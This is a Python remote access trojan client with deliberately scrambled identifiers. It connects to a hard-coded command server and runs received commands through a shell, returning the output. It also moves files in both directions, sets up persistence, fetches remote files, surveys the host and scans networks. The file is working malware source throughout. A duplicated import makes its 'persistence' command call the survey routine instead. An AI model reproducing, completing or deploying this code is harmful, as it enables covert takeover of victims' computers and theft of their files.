#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
import subprocess
import struct
import sys
try:
    from core.crypto import LTqWdFNAWGRrOFnEzPNXLrpSVbprqLyx, NWRhKgbNSvkvMUDnFuZRlBpUMUnJgApy, BBaZpepdXruqObrkEWSXhfoFORKlTPhH
    from core.filesock import CjLXxPxHYyQurzSYeNzJAXdgNVMivrcn, HOhRIwHVlAgUqVdUvEaVGenLqGggxwgI
    from core.persistence import mBuXjpkzrIUZngwxvXemPAvEUwbDTnHC
    from core.scan import ZWGbjcQGpNPIRbBEIntiGRHypLrphsBH
    from core.survey import mBuXjpkzrIUZngwxvXemPAvEUwbDTnHC
    from core.toolkit import MDtVRFxrOMzieeGphIeylKeAqJfuDFSb, NOUxdzmQvSpxotaVTzRAjYSvXjAxlOVW
except ImportError as pMVxwifEscoMgjwKQjQtaCCTOOnMIwAu:
    print(pMVxwifEscoMgjwKQjQtaCCTOOnMIwAu)
    sys.exit(0)
HzKlIRVqMbiOBSlbvaXtvBkwmitVZZZz = sys.platform
XUeVYzOIoYCjueWCfbyuYrEVHoCgCizf      = 'localhost'
ISueIUccfgQmBUKTYPjcQsGZFivwNcFP      = 1337
XWShqxSRKrLAhKvUPMMnmAidPbUnBENx    = 'b14ce95fa4c33ac2803782d18341869f'
def sNoJVUCNkupeUOKOlykohvVVATYLlHgq():
    KPIPZKXcEaYQIwVRGpzmYTezTDpMADpc = socket.socket()
    KPIPZKXcEaYQIwVRGpzmYTezTDpMADpc.connect((XUeVYzOIoYCjueWCfbyuYrEVHoCgCizf, ISueIUccfgQmBUKTYPjcQsGZFivwNcFP))
    nhAzDhVeHXftyUzuSMthbMqfazPcclpY = BBaZpepdXruqObrkEWSXhfoFORKlTPhH(KPIPZKXcEaYQIwVRGpzmYTezTDpMADpc)
    while True:
        VWTMmjbUhACOLQWijuUArCVcIsxqblGz = KPIPZKXcEaYQIwVRGpzmYTezTDpMADpc.recv(1024)
        VWTMmjbUhACOLQWijuUArCVcIsxqblGz = LTqWdFNAWGRrOFnEzPNXLrpSVbprqLyx(VWTMmjbUhACOLQWijuUArCVcIsxqblGz, nhAzDhVeHXftyUzuSMthbMqfazPcclpY)
        IYcfhHjddTKZZtTRSaiqoBkKNVpVKdud, _, action = VWTMmjbUhACOLQWijuUArCVcIsxqblGz.partition(' ')
        if IYcfhHjddTKZZtTRSaiqoBkKNVpVKdud == 'quit':
            KPIPZKXcEaYQIwVRGpzmYTezTDpMADpc.close()
            sys.exit(0)
        elif IYcfhHjddTKZZtTRSaiqoBkKNVpVKdud == 'run':
            CqLCFAGiFKpkaszSdjEiaizEkGPltyhw = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            CqLCFAGiFKpkaszSdjEiaizEkGPltyhw = CqLCFAGiFKpkaszSdjEiaizEkGPltyhw.stdout.read() + CqLCFAGiFKpkaszSdjEiaizEkGPltyhw.stderr.read()
            KPIPZKXcEaYQIwVRGpzmYTezTDpMADpc.sendall(NWRhKgbNSvkvMUDnFuZRlBpUMUnJgApy(CqLCFAGiFKpkaszSdjEiaizEkGPltyhw, nhAzDhVeHXftyUzuSMthbMqfazPcclpY))
        elif IYcfhHjddTKZZtTRSaiqoBkKNVpVKdud == 'download':
            for RJJtPMsJNduwmrIJzEAYvWHbExNuMYns in action.split():
                RJJtPMsJNduwmrIJzEAYvWHbExNuMYns = RJJtPMsJNduwmrIJzEAYvWHbExNuMYns.strip()
                HOhRIwHVlAgUqVdUvEaVGenLqGggxwgI(KPIPZKXcEaYQIwVRGpzmYTezTDpMADpc, RJJtPMsJNduwmrIJzEAYvWHbExNuMYns, nhAzDhVeHXftyUzuSMthbMqfazPcclpY)
        elif IYcfhHjddTKZZtTRSaiqoBkKNVpVKdud == 'upload':
            for RJJtPMsJNduwmrIJzEAYvWHbExNuMYns in action.split():
                RJJtPMsJNduwmrIJzEAYvWHbExNuMYns = RJJtPMsJNduwmrIJzEAYvWHbExNuMYns.strip()
                CjLXxPxHYyQurzSYeNzJAXdgNVMivrcn(KPIPZKXcEaYQIwVRGpzmYTezTDpMADpc, RJJtPMsJNduwmrIJzEAYvWHbExNuMYns, nhAzDhVeHXftyUzuSMthbMqfazPcclpY)
        elif IYcfhHjddTKZZtTRSaiqoBkKNVpVKdud == 'rekey':
            nhAzDhVeHXftyUzuSMthbMqfazPcclpY = BBaZpepdXruqObrkEWSXhfoFORKlTPhH(KPIPZKXcEaYQIwVRGpzmYTezTDpMADpc)
        elif IYcfhHjddTKZZtTRSaiqoBkKNVpVKdud == 'persistence':
            CqLCFAGiFKpkaszSdjEiaizEkGPltyhw = mBuXjpkzrIUZngwxvXemPAvEUwbDTnHC(HzKlIRVqMbiOBSlbvaXtvBkwmitVZZZz)
            KPIPZKXcEaYQIwVRGpzmYTezTDpMADpc.send(NWRhKgbNSvkvMUDnFuZRlBpUMUnJgApy(CqLCFAGiFKpkaszSdjEiaizEkGPltyhw, nhAzDhVeHXftyUzuSMthbMqfazPcclpY))
        elif IYcfhHjddTKZZtTRSaiqoBkKNVpVKdud == 'wget':
            CqLCFAGiFKpkaszSdjEiaizEkGPltyhw = MDtVRFxrOMzieeGphIeylKeAqJfuDFSb(action)
            KPIPZKXcEaYQIwVRGpzmYTezTDpMADpc.send(NWRhKgbNSvkvMUDnFuZRlBpUMUnJgApy(CqLCFAGiFKpkaszSdjEiaizEkGPltyhw, nhAzDhVeHXftyUzuSMthbMqfazPcclpY))
        elif IYcfhHjddTKZZtTRSaiqoBkKNVpVKdud == 'unzip':
            CqLCFAGiFKpkaszSdjEiaizEkGPltyhw = NOUxdzmQvSpxotaVTzRAjYSvXjAxlOVW(action)
            KPIPZKXcEaYQIwVRGpzmYTezTDpMADpc.send(NWRhKgbNSvkvMUDnFuZRlBpUMUnJgApy(CqLCFAGiFKpkaszSdjEiaizEkGPltyhw, nhAzDhVeHXftyUzuSMthbMqfazPcclpY))
        elif IYcfhHjddTKZZtTRSaiqoBkKNVpVKdud == 'survey':
            CqLCFAGiFKpkaszSdjEiaizEkGPltyhw = mBuXjpkzrIUZngwxvXemPAvEUwbDTnHC(HzKlIRVqMbiOBSlbvaXtvBkwmitVZZZz)
            KPIPZKXcEaYQIwVRGpzmYTezTDpMADpc.send(NWRhKgbNSvkvMUDnFuZRlBpUMUnJgApy(CqLCFAGiFKpkaszSdjEiaizEkGPltyhw, nhAzDhVeHXftyUzuSMthbMqfazPcclpY))
        elif IYcfhHjddTKZZtTRSaiqoBkKNVpVKdud == 'scan':
            CqLCFAGiFKpkaszSdjEiaizEkGPltyhw = ZWGbjcQGpNPIRbBEIntiGRHypLrphsBH(action)
            KPIPZKXcEaYQIwVRGpzmYTezTDpMADpc.send(NWRhKgbNSvkvMUDnFuZRlBpUMUnJgApy(CqLCFAGiFKpkaszSdjEiaizEkGPltyhw, nhAzDhVeHXftyUzuSMthbMqfazPcclpY))
if __name__ == '__main__':
    sNoJVUCNkupeUOKOlykohvVVATYLlHgq()
